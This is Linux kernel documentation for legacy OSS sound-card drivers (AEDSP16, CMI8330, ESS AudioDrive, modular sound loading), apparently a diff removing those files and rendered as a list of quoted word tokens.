"OPL3", "needs", "to", "pre", "load", "the", "aedsp16", "module", "to", "set", "up", "correctly", "the", "sound", "card", ".", "Installation", "dependencies", "must", "be", "written", "in", "configuration", "files", "under", "/", "etc", "/", "modprobe", ".", "d", "/", "directory", ":", "softdep", "ad1848", "pre", ":", "aedsp16", "softdep", "opl3", "pre", ":", "aedsp16", "Then", "you", "must", "load", "the", "sound", "modules", "stack", "in", "this", "order", ":", "sound", "-", ">", "aedsp16", "-", ">", "[", "ad1848", ",", "opl3", "]", "With", "the", "above", "configuration", ",", "loading", "ad1848", "or", "opl3", "modules", ",", "will", "automatically", "load", "all", "the", "sound", "stack", ".", "Sound", "cards", "supported", "This", "driver", "supports", "the", "SC", "-", "6000", "and", "SC", "-", "6600", "based", "Gallant", "'", "s", "sound", "card", ".", "It", "don", "'", "t", "support", "the", "Audio", "Excel", "DSP", "16", "III", "(", "try", "the", "SC", "-", "6600", "code", ")", ".", "I", "'", "m", "working", "on", "the", "III", "version", "of", "the", "card", ":", "if", "someone", "have", "useful", "information", "about", "it", ",", "please", "let", "me", "know", ".", "For", "all", "the", "non", "-", "supported", "audio", "cards", ",", "you", "have", "to", "boot", "MS", "-", "DOS", "(", "or", "WIN95", ")", "activating", "the", "audio", "card", "with", "the", "MS", "-", "DOS", "device", "driver", ",", "then", "you", "have", "to", "<", "ctrl", ">", "-<", "alt", ">", "-<", "del", ">", "and", "boot", "Linux", ".", "Follow", "these", "steps", ":", "1", ")", "Compile", "Linux", "kernel", "with", "standard", "sound", "driver", ",", "using", "the", "emulation", "you", "want", ",", "with", "the", "parameters", "of", "your", "audio", "card", ",", "e", ".", "g", ".", "Microsoft", "Sound", "System", "irq10", "dma3", "2", ")", "Install", "your", "new", "kernel", "as", "the", "default", "boot", "kernel", ".", "3", ")", "Boot", "MS", "-", "DOS", "and", "configure", "the", "audio", "card", "with", "the", "boot", "time", "device", "driver", ",", "for", "MSS", "irq10", "dma3", "in", "our", "example", ".", "4", ")", "<", "ctrl", ">", "-<", "alt", ">", "-<", "del", ">", "and", "boot", "Linux", ".", "This", "will", "maintain", "the", "DOS", "configuration", "and", "will", "boot", "the", "new", "kernel", "with", "sound", "driver", ".", "The", "sound", "driver", "will", "find", "the", "audio", "card", "and", "will", "recognize", "and", "attach", "it", ".", "Reports", "on", "User", "successes", ">", "Date", ":", "Mon", ",", "29", "Jul", "1996", "08", ":", "35", ":", "40", "+", "0100", ">", "From", ":", "Mr", "S", "J", "Greenaway", "<", "sjg95", "@", "unixfe", ".", "rl", ".", "ac", ".", "uk", ">", ">", "To", ":", "riccardo", "@", "cdc8g5", ".", "cdc", ".", "polimi", ".", "it", "(", "Riccardo", "Facchetti", ")", ">", "Subject", ":", "Re", ":", "Audio", "Excel", "DSP", "16", "initialization", "code", ">", ">", "Just", "to", "let", "you", "know", "got", "my", "Audio", "Excel", "(", "emulating", "a", "MSS", ")", "working", ">", "with", "my", "original", "SB16", ",", "thanks", "for", "the", "driver", "!", "Last", "revised", ":", "20", "August", "1998", "Riccardo", "Facchetti", "fizban", "@", "tin", ".", "it", "@", "@", "-", "1", ",", "152", "+", "0", ",", "0", "@", "@", "Documentation", "for", "CMI", "8330", "(", "SoundPRO", ")", "Alessandro", "Zummo", "<", "azummo", "@", "ita", ".", "flashnet", ".", "it", ">", "(", "Be", "sure", "to", "read", "Documentation", "/", "sound", "/", "oss", "/", "SoundPro", "too", ")", "This", "adapter", "is", "now", "directly", "supported", "by", "the", "sb", "driver", ".", "The", "only", "thing", "you", "have", "to", "do", "is", "to", "compile", "the", "kernel", "sound", "support", "as", "a", "module", "and", "to", "enable", "kernel", "ISAPnP", "support", ",", "as", "shown", "below", ".", "CONFIG_SOUND", "=", "m", "CONFIG_SOUND_SB", "=", "m", "CONFIG_PNP", "=", "y", "CONFIG_ISAPNP", "=", "y", "and", "optionally", ":", "CONFIG_SOUND_MPU401", "=", "m", "for", "MPU401", "support", ".", "(", "I", "suggest", "you", "to", "use", "\"", "make", "menuconfig", "\"", "or", "\"", "make", "xconfig", "\"", "for", "a", "more", "comfortable", "configuration", "editing", ")", "Then", "you", "can", "do", "modprobe", "sb", "and", "everything", "will", "be", "(", "hopefully", ")", "configured", ".", "You", "should", "get", "something", "similar", "in", "syslog", ":", "sb", ":", "CMI8330", "detected", ".", "sb", ":", "CMI8330", "sb", "base", "located", "at", "0x220", "sb", ":", "CMI8330", "mpu", "base", "located", "at", "0x330", "sb", ":", "CMI8330", "mail", "reports", "to", "Alessandro", "Zummo", "<", "azummo", "@", "ita", ".", "flashnet", ".", "it", ">", "sb", ":", "ISAPnP", "reports", "CMI", "8330", "SoundPRO", "at", "i", "/", "o", "0x220", ",", "irq", "7", ",", "dma", "1", ",", "5", "The", "old", "documentation", "file", "follows", "for", "reference", "purposes", ".", "How", "to", "enable", "CMI", "8330", "(", "SOUNDPRO", ")", "soundchip", "on", "Linux", "Stefan", "Laudat", "<", "Stefan", ".", "Laudat", "@", "asit", ".", "ro", ">", "[", "Note", ":", "The", "CMI", "8338", "is", "unrelated", "and", "is", "supported", "by", "cmpci", ".", "o", "]", "In", "order", "to", "use", "CMI8330", "under", "Linux", "you", "just", "have", "to", "use", "a", "proper", "isapnp", ".", "conf", ",", "a", "good", "isapnp", "and", "a", "little", "bit", "of", "patience", ".", "I", "use", "isapnp", "1", ".", "17", ",", "but", "you", "may", "get", "a", "better", "one", "I", "guess", "at", "http", ":", "//", "www", ".", "roestock", ".", "demon", ".", "co", ".", "uk", "/", "isapnptools", "/", ".", "Of", "course", "you", "will", "have", "to", "compile", "kernel", "sound", "support", "as", "module", ",", "as", "shown", "below", ":", "CONFIG_SOUND", "=", "m", "CONFIG_SOUND_OSS", "=", "m", "CONFIG_SOUND_SB", "=", "m", "CONFIG_SOUND_ADLIB", "=", "m", "CONFIG_SOUND_MPU401", "=", "m", "#", "Mikro", "$", "chaft", "sound", "system", "(", "kinda", "useful", "here", ";", "))", "CONFIG_SOUND_MSS", "=", "m", "The", "/", "etc", "/", "isapnp", ".", "conf", "file", "will", "be", ":", "<", "snip", "below", ">", "(", "READPORT", "0x0203", ")", "(", "ISOLATE", "PRESERVE", ")", "(", "IDENTIFY", "*", ")", "(", "VERBOSITY", "2", ")", "(", "CONFLICT", "(", "IO", "FATAL", ")", "(", "IRQ", "FATAL", ")", "(", "DMA", "FATAL", ")", "(", "MEM", "FATAL", ")", ")", "#", "or", "WARNING", "(", "VERIFYLD", "N", ")", "#", "WSS", "(", "CONFIGURE", "CMI0001", "/", "16777472", "(", "LD", "0", "(", "IO", "0", "(", "SIZE", "8", ")", "(", "BASE", "0x0530", ")", ")", "(", "IO", "1", "(", "SIZE", "8", ")", "(", "BASE", "0x0388", ")", ")", "(", "INT", "0", "(", "IRQ", "7", "(", "MODE", "+", "E", ")", "))", "(", "DMA", "0", "(", "CHANNEL", "0", ")", ")", "(", "NAME", "\"", "CMI0001", "/", "16777472", "[", "0", "]", "{", "CMI8330", "/", "C3D", "Audio", "Adapter", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "#", "MPU", "(", "CONFIGURE", "CMI0001", "/", "16777472", "(", "LD", "1", "(", "IO", "0", "(", "SIZE", "2", ")", "(", "BASE", "0x0330", ")", ")", "(", "INT", "0", "(", "IRQ", "11", "(", "MODE", "+", "E", ")", "))", "(", "NAME", "\"", "CMI0001", "/", "16777472", "[", "1", "]", "{", "CMI8330", "/", "C3D", "Audio", "Adapter", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "#", "Joystick", "(", "CONFIGURE", "CMI0001", "/", "16777472", "(", "LD", "2", "(", "IO", "0", "(", "SIZE", "8", ")", "(", "BASE", "0x0200", ")", ")", "(", "NAME", "\"", "CMI0001", "/", "16777472", "[", "2", "]", "{", "CMI8330", "/", "C3D", "Audio", "Adapter", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "#", "SoundBlaster", "(", "CONFIGURE", "CMI0001", "/", "16777472", "(", "LD", "3", "(", "IO", "0", "(", "SIZE", "16", ")", "(", "BASE", "0x0220", ")", ")", "(", "INT", "0", "(", "IRQ", "5", "(", "MODE", "+", "E", ")", "))", "(", "DMA", "0", "(", "CHANNEL", "1", ")", ")", "(", "DMA", "1", "(", "CHANNEL", "5", ")", ")", "(", "NAME", "\"", "CMI0001", "/", "16777472", "[", "3", "]", "{", "CMI8330", "/", "C3D", "Audio", "Adapter", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "(", "WAITFORKEY", ")", "<", "end", "of", "snip", ">", "The", "module", "sequence", "is", "trivial", ":", "/", "sbin", "/", "insmod", "soundcore", "/", "sbin", "/", "insmod", "sound", "/", "sbin", "/", "insmod", "uart401", "#", "insert", "this", "first", "/", "sbin", "/", "insmod", "ad1848", "io", "=", "0x530", "irq", "=", "7", "dma", "=", "0", "soundpro", "=", "1", "#", "The", "sb", "module", "is", "an", "alternative", "to", "the", "ad1848", "(", "Microsoft", "Sound", "System", ")", "#", "Anyhow", ",", "this", "is", "full", "duplex", "and", "has", "MIDI", "/", "sbin", "/", "insmod", "sb", "io", "=", "0x220", "dma", "=", "1", "dma16", "=", "5", "irq", "=", "5", "mpu_io", "=", "0x330", "Alma", "Chao", "<", "elysian", "@", "ethereal", ".", "torsion", ".", "org", ">", "suggests", "the", "following", "in", "a", "/", "etc", "/", "modprobe", ".", "d", "/", "*", "conf", "file", ":", "alias", "sound", "ad1848", "alias", "synth0", "opl3", "options", "ad1848", "io", "=", "0x530", "irq", "=", "7", "dma", "=", "0", "soundpro", "=", "1", "options", "opl3", "io", "=", "0x388", "@", "@", "-", "1", ",", "34", "+", "0", ",", "0", "@", "@", "Documentation", "for", "the", "ESS", "AudioDrive", "chips", "In", "2", ".", "4", "kernels", "the", "SoundBlaster", "driver", "not", "only", "tries", "to", "detect", "an", "ESS", "chip", ",", "it", "tries", "to", "detect", "the", "type", "of", "ESS", "chip", "too", ".", "The", "correct", "detection", "of", "the", "chip", "doesn", "'", "t", "always", "succeed", "however", ",", "so", "unless", "you", "use", "the", "kernel", "isapnp", "facilities", "(", "and", "you", "chip", "is", "pnp", "capable", ")", "the", "default", "behaviour", "is", "2", ".", "0", "behaviour", "which", "means", ":", "only", "detect", "ES688", "and", "ES1688", ".", "All", "ESS", "chips", "now", "have", "a", "recording", "level", "setting", ".", "This", "is", "a", "need", "-", "to", "-", "have", "for", "people", "who", "want", "to", "use", "their", "ESS", "for", "recording", "sound", ".", "Every", "chip", "that", "'", "s", "detected", "as", "a", "later", "-", "than", "-", "es1688", "chip", "has", "a", "6", "bits", "logarithmic", "master", "volume", "control", ".", "Every", "chip", "that", "'", "s", "detected", "as", "a", "ES1887", "now", "has", "Full", "Duplex", "support", ".", "Made", "a", "little", "testprogram", "that", "shows", "that", "is", "works", ",", "haven", "'", "t", "seen", "a", "real", "program", "that", "needs", "this", "however", ".", "For", "ESS", "chips", "an", "additional", "parameter", "\"", "esstype", "\"", "can", "be", "specified", ".", "This", "controls", "the", "(", "auto", ")", "detection", "of", "the", "ESS", "chips", ".", "It", "can", "have", "3", "kinds", "of", "values", ":", "1", "Act", "like", "2", ".", "0", "kernels", ":", "only", "detect", "ES688", "or", "ES1688", ".", "0", "Try", "to", "auto", "-", "detect", "the", "chip", "(", "may", "fail", "for", "ES1688", ")", "688", "The", "chip", "will", "be", "treated", "as", "ES688", "1688", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1688", "1868", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1868", "1869", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1869", "1788", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1788", "1887", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1887", "1888", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", ",", "ES1888", "Because", "Full", "Duplex", "is", "supported", "for", "ES1887", "you", "can", "specify", "a", "second", "DMA", "channel", "by", "specifying", "module", "parameter", "dma16", ".", "It", "can", "be", "one", "of", ":", "0", ",", "1", ",", "3", "or", "5", ".", "@", "@", "-", "1", ",", "55", "+", "0", ",", "0", "@", "@", "Documentation", "for", "the", "ESS1868F", "AudioDrive", "PnP", "sound", "card", "The", "ESS1868", "sound", "card", "is", "a", "PnP", "ESS1688", "-", "compatible", "16", "-", "bit", "sound", "card", ".", "It", "should", "be", "automatically", "detected", "by", "the", "Linux", "Kernel", "isapnp", "support", "when", "you", "load", "the", "sb", ".", "o", "module", ".", "Otherwise", "you", "should", "take", "care", "of", ":", "*", "The", "ESS1868", "does", "not", "allow", "use", "of", "a", "16", "-", "bit", "DMA", ",", "thus", "DMA", "0", ",", "1", ",", "2", ",", "and", "3", "may", "only", "be", "used", ".", "*", "isapnptools", "version", "1", ".", "14", "does", "work", "with", "ESS1868", ".", "Earlier", "versions", "might", "not", ".", "*", "Sound", "support", "MUST", "be", "compiled", "as", "MODULES", ",", "not", "statically", "linked", "into", "the", "kernel", ".", "NOTE", ":", "this", "is", "only", "needed", "when", "not", "using", "the", "kernel", "isapnp", "support", "!", "For", "configuring", "the", "sound", "card", "'", "s", "I", "/", "O", "addresses", ",", "IRQ", "and", "DMA", ",", "here", "is", "a", "sample", "copy", "of", "the", "isapnp", ".", "conf", "directives", "regarding", "the", "ESS1868", ":", "(", "CONFIGURE", "ESS1868", "/", "-", "1", "(", "LD", "1", "(", "IO", "0", "(", "BASE", "0x0220", ")", ")", "(", "IO", "1", "(", "BASE", "0x0388", ")", ")", "(", "IO", "2", "(", "BASE", "0x0330", ")", ")", "(", "DMA", "0", "(", "CHANNEL", "1", ")", ")", "(", "INT", "0", "(", "IRQ", "5", "(", "MODE", "+", "E", ")", "))", "(", "ACT", "Y", ")", ")", ")", "(", "for", "a", "full", "working", "isapnp", ".", "conf", "file", ",", "remember", "the", "(", "ISOLATE", ")", "(", "IDENTIFY", "*", ")", "at", "the", "beginning", "and", "the", "(", "WAITFORKEY", ")", "at", "the", "end", ".", ")", "In", "this", "setup", ",", "the", "main", "card", "I", "/", "O", "is", "0x0220", ",", "FM", "synthesizer", "is", "0x0388", ",", "and", "the", "MPU", "-", "401", "MIDI", "port", "is", "located", "at", "0x0330", ".", "IRQ", "is", "IRQ", "5", ",", "DMA", "is", "channel", "1", ".", "After", "configuring", "the", "sound", "card", "via", "isapnp", ",", "to", "use", "the", "card", "you", "must", "load", "the", "sound", "modules", "with", "the", "proper", "I", "/", "O", "information", ".", "Here", "is", "my", "setup", ":", "#", "ESS1868F", "AudioDrive", "initialization", "/", "sbin", "/", "modprobe", "sound", "/", "sbin", "/", "insmod", "uart401", "/", "sbin", "/", "insmod", "sb", "io", "=", "0x220", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "-", "1", "/", "sbin", "/", "insmod", "mpu401", "io", "=", "0x330", "/", "sbin", "/", "insmod", "opl3", "io", "=", "0x388", "/", "sbin", "/", "insmod", "v_midi", "opl3", "is", "the", "FM", "synthesizer", "/", "sbin", "/", "insmod", "opl3", "io", "=", "0x388", "@", "@", "-", "1", ",", "459", "+", "0", ",", "0", "@", "@", "Introduction", "Notes", "on", "Modular", "Sound", "Drivers", "and", "Soundcore", "Wade", "Hampton", "2", "/", "14", "/", "2001", "Purpose", ":", "=", "==", "==", "==", "=", "This", "document", "provides", "some", "general", "notes", "on", "the", "modular", "sound", "drivers", "and", "their", "configuration", ",", "along", "with", "the", "support", "modules", "sound", ".", "o", "and", "soundcore", ".", "o", ".", "Note", ",", "some", "of", "this", "probably", "should", "be", "added", "to", "the", "Sound", "-", "HOWTO", "!", "Note", ",", "soundlow", ".", "o", "was", "present", "with", "2", ".", "2", "kernels", "but", "is", "not", "required", "for", "2", ".", "4", ".", "x", "kernels", ".", "References", "have", "been", "removed", "to", "this", ".", "Copying", ":", "=", "==", "==", "==", "=", "none", "History", ":", "=", "==", "==", "==", "=", "0", ".", "1", ".", "0", "11", "/", "20", "/", "1998", "First", "version", ",", "draft", "1", ".", "0", ".", "0", "11", "/", "1998", "Alan", "Cox", "changes", ",", "incorporation", "in", "2", ".", "2", ".", "0", "as", "Documentation", "/", "sound", "/", "oss", "/", "Introduction", "1", ".", "1", ".", "0", "6", "/", "30", "/", "1999", "Second", "version", ",", "added", "notes", "on", "making", "the", "drivers", ",", "added", "info", "on", "multiple", "sound", "cards", "of", "similar", "types", ",", "]", "added", "more", "diagnostics", "info", ",", "added", "info", "about", "esd", ".", "added", "info", "on", "OSS", "and", "ALSA", ".", "1", ".", "1", ".", "1", "19991031", "Added", "notes", "on", "sound", "-", "slot", "-", "and", "sound", "-", "service", ".", "(", "Alan", "Cox", ")", "1", ".", "1", ".", "2", "20000920", "Modified", "for", "Kernel", "2", ".", "4", "(", "Christoph", "Hellwig", ")", "1", ".", "1", ".", "3", "20010214", "Minor", "notes", "and", "corrections", "(", "Wade", "Hampton", ")", "Added", "examples", "of", "sound", "-", "slot", "-", "0", ",", "etc", ".", "Modular", "Sound", "Drivers", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Thanks", "to", "the", "GREAT", "work", "by", "Alan", "Cox", "(", "alan", "@", "lxorguk", ".", "ukuu", ".", "org", ".", "uk", ")", ",", "[", "And", "Oleg", "Drokin", ",", "Thomas", "Sailer", ",", "Andrew", "Veliath", "and", "more", "than", "a", "few", "others", "-", "not", "to", "mention", "Hannu", "'", "s", "original", "code", "being", "designed", "well", "enough", "to", "cope", "with", "that", "kind", "of", "chopping", "up", "]", "(", "Alan", ")", "the", "standard", "Linux", "kernels", "support", "a", "modular", "sound", "driver", ".", "From", "Alan", "'", "s", "comments", "in", "linux", "/", "drivers", "/", "sound", "/", "README", ".", "FIRST", ":", "The", "modular", "sound", "driver", "patches", "were", "funded", "by", "Red", "Hat", "Software", "(", "www", ".", "redhat", ".", "com", ")", ".", "The", "sound", "driver", "here", "is", "thus", "a", "modified", "version", "of", "Hannu", "'", "s", "code", ".", "Please", "bear", "that", "in", "mind", "when", "considering", "the", "appropriate", "forums", "for", "bug", "reporting", ".", "The", "modular", "sound", "drivers", "may", "be", "loaded", "via", "insmod", "or", "modprobe", ".", "To", "support", "all", "the", "various", "sound", "modules", ",", "there", "are", "two", "general", "support", "modules", "that", "must", "be", "loaded", "first", ":", "soundcore", ".", "o", ":", "Top", "level", "handler", "for", "the", "sound", "system", ",", "provides", "a", "set", "of", "functions", "for", "registration", "of", "devices", "by", "type", ".", "sound", ".", "o", ":", "Common", "sound", "functions", "required", "by", "all", "modules", ".", "For", "the", "specific", "sound", "modules", "(", "e", ".", "g", ".", ",", "sb", ".", "o", "for", "the", "Soundblaster", ")", ",", "read", "the", "documentation", "on", "that", "module", "to", "determine", "what", "options", "are", "available", ",", "for", "example", "IRQ", ",", "address", ",", "DMA", ".", "Warning", ",", "the", "options", "for", "different", "cards", "sometime", "use", "different", "names", "for", "the", "same", "or", "a", "similar", "feature", "(", "dma1", "=", "versus", "dma16", "=", ").", "As", "a", "last", "resort", ",", "inspect", "the", "code", "(", "search", "for", "module_param", ")", ".", "Notes", ":", "1", ".", "There", "is", "a", "new", "OpenSource", "sound", "driver", "called", "ALSA", "which", "is", "currently", "under", "development", ":", "http", ":", "//", "www", ".", "alsa", "-", "project", ".", "org", "/", "The", "ALSA", "drivers", "support", "some", "newer", "hardware", "that", "may", "not", "be", "supported", "by", "this", "sound", "driver", "and", "also", "provide", "some", "additional", "features", ".", "2", ".", "The", "commercial", "OSS", "driver", "may", "be", "obtained", "from", "the", "site", ":", "http", ":", "//", "www", ".", "opensound", ".", "com", ".", "This", "may", "be", "used", "for", "cards", "that", "are", "unsupported", "by", "the", "kernel", "driver", ",", "or", "may", "be", "used", "by", "other", "operating", "systems", ".", "3", ".", "The", "enlightenment", "sound", "daemon", "may", "be", "used", "for", "playing", "multiple", "sounds", "at", "the", "same", "time", "via", "a", "single", "card", ",", "eliminating", "some", "of", "the", "requirements", "for", "multiple", "sound", "card", "systems", ".", "For", "more", "information", ",", "see", ":", "http", ":", "//", "www", ".", "tux", ".", "org", "/", "~", "ricdude", "/", "EsounD", ".", "html", "The", "\"", "esd", "\"", "program", "may", "be", "used", "with", "the", "real", "-", "player", "and", "mpeg", "players", "like", "mpg123", "and", "x11amp", ".", "The", "newer", "real", "-", "player", "and", "some", "games", "even", "include", "built", "-", "in", "support", "for", "ESD", "!", "Building", "the", "Modules", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "This", "document", "does", "not", "provide", "full", "details", "on", "building", "the", "kernel", ",", "etc", ".", "The", "notes", "below", "apply", "only", "to", "making", "the", "kernel", "sound", "modules", ".", "If", "this", "conflicts", "with", "the", "kernel", "'", "s", "README", ",", "the", "README", "takes", "precedence", ".", "1", ".", "To", "make", "the", "kernel", "sound", "modules", ",", "cd", "to", "your", "/", "usr", "/", "src", "/", "linux", "directory", "(", "typically", ")", "and", "type", "make", "config", ",", "make", "menuconfig", ",", "or", "make", "xconfig", "(", "to", "start", "the", "command", "line", ",", "dialog", ",", "or", "x", "-", "based", "configuration", "tool", ")", ".", "2", ".", "Select", "the", "Sound", "option", "and", "a", "dialog", "will", "be", "displayed", ".", "3", ".", "Select", "M", "(", "module", ")", "for", "\"", "Sound", "card", "support", "\"", ".", "4", ".", "Select", "your", "sound", "driver", "(", "s", ")", "as", "a", "module", ".", "For", "ProAudio", ",", "Sound", "Blaster", ",", "etc", ".", ",", "select", "M", "(", "module", ")", "for", "OSS", "sound", "modules", ".", "[", "thanks", "to", "Marvin", "Stodolsky", "<", "stodolsk", "@", "erols", ".", "com", ">", "]", "A", "5", ".", "Make", "the", "kernel", "(", "e", ".", "g", ".", ",", "make", "bzImage", ")", ",", "and", "install", "the", "kernel", ".", "6", ".", "Make", "the", "modules", "and", "install", "them", "(", "make", "modules", ";", "make", "modules_install", ")", ".", "Note", ",", "for", "2", ".", "5", ".", "x", "kernels", ",", "make", "sure", "you", "have", "the", "newer", "module", "-", "init", "-", "tools", "installed", "or", "modules", "will", "not", "be", "loaded", "properly", ".", "2", ".", "5", ".", "x", "requires", "an", "updated", "module", "-", "init", "-", "tools", ".", "Plug", "and", "Play", "(", "PnP", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "If", "the", "sound", "card", "is", "an", "ISA", "PnP", "card", ",", "isapnp", "may", "be", "used", "to", "configure", "the", "card", ".", "See", "the", "file", "isapnp", ".", "txt", "in", "the", "directory", "one", "level", "up", "(", "e", ".", "g", ".", ",", "/", "usr", "/", "src", "/", "linux", "/", "Documentation", ")", ".", "Also", "the", "2", ".", "4", ".", "x", "kernels", "provide", "PnP", "capabilities", ",", "see", "the", "file", "NEWS", "in", "this", "directory", ".", "PCI", "sound", "cards", "are", "highly", "recommended", ",", "as", "they", "are", "far", "easier", "to", "configure", "and", "from", "what", "I", "have", "read", ",", "they", "use", "less", "resources", "and", "are", "more", "CPU", "efficient", ".", "INSMOD", ":", "=", "==", "==", "==", "If", "loading", "via", "insmod", ",", "the", "common", "modules", "must", "be", "loaded", "in", "the", "order", "below", "BEFORE", "loading", "the", "other", "sound", "modules", ".", "The", "card", "-", "specific", "modules", "may", "then", "be", "loaded", "(", "most", "require", "parameters", ")", ".", "For", "example", ",", "I", "use", "the", "following", "via", "a", "shell", "script", "to", "load", "my", "SoundBlaster", ":", "SB_BASE", "=", "0x240", "SB_IRQ", "=", "9", "SB_DMA", "=", "3", "SB_DMA2", "=", "5", "SB_MPU", "=", "0x300", "#", "echo", "Starting", "sound", "/", "sbin", "/", "insmod", "soundcore", "/", "sbin", "/", "insmod", "sound", "#", "echo", "Starting", "sound", "blaster", ".", "..", ".", "/", "sbin", "/", "insmod", "uart401", "/", "sbin", "/", "insmod", "sb", "io", "=", "$", "SB_BASE", "irq", "=", "$", "SB_IRQ", "dma", "=", "$", "SB_DMA", "dma16", "=", "$", "SB_DMA2", "mpu_io", "=", "$", "SB_MP", "When", "using", "sound", "as", "a", "module", ",", "I", "typically", "put", "these", "commands", "in", "a", "file", "such", "as", "/", "root", "/", "soundon", ".", "sh", ".", "MODPROBE", ":", "=", "==", "==", "==", "==", "If", "loading", "via", "modprobe", ",", "these", "common", "files", "are", "automatically", "loaded", "when", "requested", "by", "modprobe", ".", "For", "example", ",", "my", "/", "etc", "/", "modprobe", ".", "d", "/", "oss", ".", "conf", "contains", ":", "alias", "sound", "sb", "options", "sb", "io", "=", "0x240", "irq", "=", "9", "dma", "=", "3", "dma16", "=", "5", "mpu_io", "=", "0x300", "All", "you", "need", "to", "do", "to", "load", "the", "module", "is", ":", "/", "sbin", "/", "modprobe", "sb", "Sound", "Status", ":", "=", "==", "==", "==", "==", "==", "==", "The", "status", "of", "sound", "may", "be", "read", "/", "checked", "by", ":", "cat", "(", "anyfile", ")", ".", "au", ">", "/", "dev", "/", "audio", "[", "WWH", ":", "This", "may", "not", "work", "properly", "for", "SoundBlaster", "PCI", "128", "cards", "such", "as", "the", "es1370", "/", "1", "(", "see", "the", "es1370", "/", "1", "files", "in", "this", "directory", ")", "as", "they", "do", "not", "automatically", "support", "uLaw", "on", "/", "dev", "/", "audio", ".", "]", "The", "status", "of", "the", "modules", "and", "which", "modules", "depend", "on", "which", "other", "modules", "may", "be", "checked", "by", ":", "/", "sbin", "/", "lsmod", "/", "sbin", "/", "lsmod", "should", "show", "something", "like", "the", "following", ":", "sb", "26280", "0", "uart401", "5640", "0", "[", "sb", "]", "sound", "57112", "0", "[", "sb", "uart401", "]", "soundcore", "1968", "8", "[", "sb", "sound", "]", "Removing", "Sound", ":", "=", "==", "==", "==", "==", "==", "==", "==", "Sound", "may", "be", "removed", "by", "using", "/", "sbin", "/", "rmmod", "in", "the", "reverse", "order", "in", "which", "you", "load", "the", "modules", ".", "Note", ",", "if", "a", "program", "has", "a", "sound", "device", "open", "(", "e", ".", "g", ".", ",", "xmixer", ")", ",", "that", "module", "(", "and", "the", "modules", "on", "which", "it", "depends", ")", "may", "not", "be", "unloaded", ".", "For", "example", ",", "I", "use", "the", "following", "to", "remove", "my", "Soundblaster", "(", "rmmod", "in", "the", "reverse", "order", "in", "which", "I", "loaded", "the", "modules", ")", ":", "/", "sbin", "/", "rmmod", "sb", "/", "sbin", "/", "rmmod", "uart401", "/", "sbin", "/", "rmmod", "sound", "/", "sbin", "/", "rmmod", "soundcore", "When", "using", "sound", "as", "a", "module", ",", "I", "typically", "put", "these", "commands", "in", "a", "script", "such", "as", "/", "root", "/", "soundoff", ".", "sh", ".", "Removing", "Sound", "for", "use", "with", "OSS", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "If", "you", "get", "really", "stuck", "or", "have", "a", "card", "that", "the", "kernel", "modules", "will", "not", "support", ",", "you", "can", "get", "a", "commercial", "sound", "driver", "from", "http", ":", "//", "www", ".", "opensound", ".", "com", ".", "Before", "loading", "the", "commercial", "sound", "driver", ",", "you", "should", "do", "the", "following", ":", "1", ".", "remove", "sound", "modules", "(", "detailed", "above", ")", "2", ".", "remove", "the", "sound", "modules", "from", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", "3", ".", "move", "the", "sound", "modules", "from", "/", "lib", "/", "modules", "/", "<", "kernel", ">", "/", "misc", "(", "for", "example", ",", "I", "make", "a", "/", "lib", "/", "modules", "/", "<", "kernel", ">", "/", "misc", "/", "tmp", "directory", "and", "copy", "the", "sound", "module", "files", "to", "that", "directory", ")", ".", "Multiple", "Sound", "Cards", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "The", "sound", "drivers", "will", "support", "multiple", "sound", "cards", "and", "there", "are", "some", "great", "applications", "like", "multitrack", "that", "support", "them", ".", "Typically", ",", "you", "need", "two", "sound", "cards", "of", "different", "types", ".", "Note", ",", "this", "uses", "more", "precious", "interrupts", "and", "DMA", "channels", "and", "sometimes", "can", "be", "a", "configuration", "nightmare", ".", "I", "have", "heard", "reports", "of", "3", "-", "4", "sound", "cards", "(", "typically", "I", "only", "use", "2", ")", ".", "You", "can", "sometimes", "use", "multiple", "PCI", "sound", "cards", "of", "the", "same", "type", ".", "On", "my", "machine", "I", "have", "two", "sound", "cards", "(", "cs4232", "and", "Soundblaster", "Vibra", "16", ")", ".", "By", "loading", "sound", "as", "modules", ",", "I", "can", "control", "which", "is", "the", "first", "sound", "device", "(", "/", "dev", "/", "dsp", ",", "/", "dev", "/", "audio", ",", "/", "dev", "/", "mixer", ")", "and", "which", "is", "the", "second", ".", "Normally", ",", "the", "cs4232", "(", "Dell", "sound", "on", "the", "motherboard", ")", "would", "be", "the", "first", "sound", "device", ",", "but", "I", "prefer", "the", "Soundblaster", ".", "All", "you", "have", "to", "do", "is", "to", "load", "the", "one", "you", "want", "as", "/", "dev", "/", "dsp", "first", "(", "in", "my", "case", "\"", "sb", "\"", ")", "and", "then", "load", "the", "other", "one", "(", "in", "my", "case", "\"", "cs4232", "\"", ").", "If", "you", "have", "two", "cards", "of", "the", "same", "type", "that", "are", "jumpered", "cards", "or", "different", "PnP", "revisions", ",", "you", "may", "load", "the", "same", "module", "twice", ".", "For", "example", ",", "I", "have", "a", "SoundBlaster", "vibra", "16", "and", "an", "older", "SoundBlaster", "16", "(", "jumpers", ")", ".", "To", "load", "the", "module", "twice", ",", "you", "need", "to", "do", "the", "following", ":", "1", ".", "Copy", "the", "sound", "modules", "to", "a", "new", "name", ".", "For", "example", "sb", ".", "o", "could", "be", "copied", "(", "or", "symlinked", ")", "to", "sb1", ".", "o", "for", "the", "second", "SoundBlaster", ".", "2", ".", "Make", "a", "second", "entry", "in", "/", "etc", "/", "modprobe", ".", "d", "/", "*", "conf", ",", "for", "example", ",", "sound1", "or", "sb1", 